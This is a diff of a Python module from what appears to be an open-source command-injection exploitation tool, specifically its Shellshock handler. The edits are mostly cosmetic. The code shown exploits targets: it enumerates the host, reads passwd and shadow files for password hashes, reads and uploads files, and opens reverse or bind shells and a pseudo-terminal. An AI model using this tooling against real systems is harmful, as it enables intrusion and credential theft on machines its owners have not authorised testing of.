@@ -94,8 +94,6 @@ def enumeration(url, cve, check_header, filename):
     cmd = settings.HOSTNAME
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if shell:
-      # if settings.VERBOSITY_LEVEL >= 1:
-      #   print ""
       success_msg = "The hostname is " +  shell
       sys.stdout.write(settings.print_success_msg(success_msg) + ".\n")
       sys.stdout.flush()
@@ -124,8 +122,6 @@ def enumeration(url, cve, check_header, filename):
         cmd = settings.RECOGNISE_HP
         target_arch, payload = cmd_exec(url, cmd, cve, check_header, filename)
         if target_arch:
-          # if settings.VERBOSITY_LEVEL >= 1:
-          #   print ""
           success_msg = "The target operating system is " +  target_os + Style.RESET_ALL  
           success_msg += Style.BRIGHT + " and the hardware platform is " +  target_arch
           sys.stdout.write(settings.print_success_msg(success_msg) + ".\n")
@@ -137,8 +133,6 @@ def enumeration(url, cve, check_header, filename):
           output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.SUCCESS_SIGN) + success_msg)
           output_file.close()
       else:
-        # if settings.VERBOSITY_LEVEL >= 1:
-        #   print ""
         success_msg = "The target operating system is " +  target_os   
         sys.stdout.write(settings.print_success_msg(success_msg) + ".\n")
         sys.stdout.flush()
@@ -163,8 +157,6 @@ def enumeration(url, cve, check_header, filename):
         cmd = re.findall(r"" + "\$(.*)", settings.IS_ROOT)
         cmd = ''.join(cmd).replace("(","").replace(")","")
         shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-        # if settings.VERBOSITY_LEVEL >= 1:
-        #   print ""
         success_msg = "The current user is " +  cu_account  
         sys.stdout.write(settings.print_success_msg(success_msg))
         # Add infos to logs file.    
@@ -188,8 +180,6 @@ def enumeration(url, cve, check_header, filename):
             output_file.write(" and it is privileged.\n")
             output_file.close()
       else:
-        # if settings.VERBOSITY_LEVEL >= 1:
-        #   print ""
         success_msg = "The current user is " +  cu_account  
         sys.stdout.write(settings.print_success_msg(success_msg))
         sys.stdout.flush()
@@ -209,8 +199,6 @@ def enumeration(url, cve, check_header, filename):
   if menu.options.users:
     cmd = settings.SYS_USERS             
     sys_users, payload = cmd_exec(url, cmd, cve, check_header, filename)
-    # if settings.VERBOSITY_LEVEL >= 1:
-    #   print ""
     info_msg = "Fetching '" + settings.PASSWD_FILE 
     info_msg += "' to enumerate users entries... "  
     sys.stdout.write(settings.print_info_msg(info_msg))
@@ -330,8 +318,6 @@ def enumeration(url, cve, check_header, filename):
       sys_passes = sys_passes.replace(" ", "\n")
       sys_passes = sys_passes.split( )
       if len(sys_passes) != 0 :
-        # if settings.VERBOSITY_LEVEL >= 1:
-        #   print ""
         info_msg = "Fetching '" + settings.SHADOW_FILE 
         info_msg += "' to enumerate users password hashes... "  
         sys.stdout.write(settings.print_info_msg(info_msg))
@@ -374,9 +360,6 @@ def enumeration(url, cve, check_header, filename):
         warn_msg += settings.SHADOW_FILE + "' to enumerate users password hashes."
         print settings.print_warning_msg(warn_msg)
     settings.ENUMERATION_DONE = True  
-
-  # if settings.ENUMERATION_DONE == True:
-  #   print ""
 
 """
 File Access Options
@@ -423,8 +406,6 @@ def file_access(url, cve, check_header, filename):
     # Check if defined cookie injection.
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if shell:
-      # if settings.VERBOSITY_LEVEL >= 1:
-      #   print ""
       success_msg = "The " +  shell + Style.RESET_ALL 
       success_msg += Style.BRIGHT + " file was created successfully!"  
       sys.stdout.write(settings.print_success_msg(success_msg))
@@ -441,7 +422,6 @@ def file_access(url, cve, check_header, filename):
   #-------------------------------------
   if menu.options.file_upload:
     file_to_upload = menu.options.file_upload
-    
     # check if remote file exists.
     try:
       urllib2.urlopen(file_to_upload)
@@ -475,8 +455,6 @@ def file_access(url, cve, check_header, filename):
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     shell = "".join(str(p) for p in shell)
     if shell:
-      # if settings.VERBOSITY_LEVEL >= 1:
-      #   print ""
       success_msg = "The " +  shell 
       success_msg += Style.RESET_ALL + Style.BRIGHT 
       success_msg += " file was uploaded successfully!\n"
@@ -498,8 +476,6 @@ def file_access(url, cve, check_header, filename):
     cmd = "cat " + settings.FILE_READ + file_to_read
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if shell:
-      # if settings.VERBOSITY_LEVEL >= 1:
-      #   print ""
       success_msg = "The contents of file '"  
       success_msg += file_to_read + "'" + Style.RESET_ALL + ": "  
       sys.stdout.write(settings.print_success_msg(success_msg))
@@ -540,7 +516,7 @@ def bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http
 
   settings.BIND_TCP = True
   # Set up RHOST / LPORT for the bind TCP connection.
-  bind_tcp.configure_bind_tcp()
+  bind_tcp.configure_bind_tcp(separator = "")
 
   if settings.BIND_TCP == False:
     if settings.REVERSE_TCP == True:
@@ -573,7 +549,7 @@ def reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, h
 
   settings.REVERSE_TCP = True
   # Set up LHOST / LPORT for the reverse TCP connection.
-  reverse_tcp.configure_reverse_tcp()
+  reverse_tcp.configure_reverse_tcp(separator = "")
 
   if settings.REVERSE_TCP == False:
     if settings.BIND_TCP == True:
@@ -722,7 +698,6 @@ def shellshock_handler(url, http_request_method, filename):
           if export_injection_info == False:
             export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
           
-          #if vp_flag == True:
           vuln_parameter = "HTTP Header"
           the_type = " " + vuln_parameter
           check_header = " " + check_header
@@ -730,7 +705,9 @@ def shellshock_handler(url, http_request_method, filename):
           check_header = check_header[1:]
           logs.update_payload(filename, counter, payload) 
 
-          checks.total_of_requests()
+          if settings.VERBOSITY_LEVEL >= 1:
+            checks.total_of_requests()
+
           success_msg = "The (" + check_header + ") '"
           success_msg += url + Style.RESET_ALL + Style.BRIGHT 
           success_msg += "' seems vulnerable via " + technique + "."
@@ -738,8 +715,7 @@ def shellshock_handler(url, http_request_method, filename):
             print ""
           print settings.print_success_msg(success_msg)
           print settings.SUB_CONTENT_SIGN + "Payload: " + "\"" + payload + "\"" + Style.RESET_ALL
-          # if not settings.VERBOSITY_LEVEL >= 1:
-          #   print ""
+
           # Enumeration options.
           if settings.ENUMERATION_DONE == True :
             if settings.VERBOSITY_LEVEL >= 1:
@@ -806,19 +782,17 @@ def shellshock_handler(url, http_request_method, filename):
             while True:
               if go_back == True:
                 break
-              # if settings.ENUMERATION_DONE == False and settings.FILE_ACCESS_DONE == False:
-              #   if settings.VERBOSITY_LEVEL >= 1:
-              #     print ""
               if not menu.options.batch:
                 question_msg = "Do you want a Pseudo-Terminal shell? [Y/n] > "
                 sys.stdout.write(settings.print_question_msg(question_msg))
                 gotshell = sys.stdin.readline().replace("\n","").lower()
-                print ""
               else:
                 gotshell= ""  
               if len(gotshell) == 0:
                  gotshell= "y"
               if gotshell in settings.CHOICE_YES:
+                if not menu.options.batch:
+                  print ""
                 print "Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
                 if readline_error:
                   checks.no_readline_module()
@@ -859,8 +833,6 @@ def shellshock_handler(url, http_request_method, filename):
                           sys.stdout.write(settings.print_info_msg(info_msg))
                           sys.stdout.flush()
                           sys.stdout.write("\n" + settings.print_payload(payload)+ "\n")
-
-                          #print "\n" + settings.print_payload(payload) 
                         err_msg = "The '" + cmd + "' command, does not return any output."
                         print settings.print_critical_msg(err_msg) + "\n"
 
@@ -881,8 +853,6 @@ def shellshock_handler(url, http_request_method, filename):
                       info_msg = info_msg + "\n"
                     sys.stdout.write(settings.print_info_msg(info_msg))
                     sys.stdout.flush()
-                    #print ""
-                    #raise SystemExit()
                     break
                     
               elif gotshell in settings.CHOICE_NO:
